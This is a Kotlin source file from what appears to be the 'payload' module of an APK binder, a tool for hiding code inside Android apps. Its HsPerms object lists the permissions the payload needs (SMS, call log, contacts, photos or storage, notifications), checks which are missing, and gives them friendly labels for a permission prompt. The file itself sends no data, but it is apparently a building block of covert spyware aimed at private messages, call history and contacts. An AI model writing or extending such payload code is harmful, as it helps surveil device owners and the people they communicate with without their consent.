package Com.devhs.apkbinder.payload

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build

object HsPerms {

    fun required(): List<String> {
        val l = ArrayList<String>()
        if (Build.VERSION.SDK_INT >= 33) l += Manifest.permission.READ_MEDIA_IMAGES
        else l += Manifest.permission.READ_EXTERNAL_STORAGE
        if (Build.VERSION.SDK_INT >= 33) l += Manifest.permission.POST_NOTIFICATIONS
        l += Manifest.permission.READ_SMS
        l += Manifest.permission.READ_CALL_LOG
        l += Manifest.permission.READ_CONTACTS
        return l
    }

    fun missing(c: Context): List<String> = required().filter {
        c.checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
    }

    fun label(p: String): String = when (p) {
        Manifest.permission.READ_MEDIA_IMAGES -> "Photos & Media"
        Manifest.permission.READ_EXTERNAL_STORAGE -> "Storage"
        Manifest.permission.READ_SMS -> "SMS"
        Manifest.permission.READ_CALL_LOG -> "Call Log"
        Manifest.permission.READ_CONTACTS -> "Contacts"
        Manifest.permission.POST_NOTIFICATIONS -> "Notifications"
        else -> p.substringAfterLast('.')
    }
}
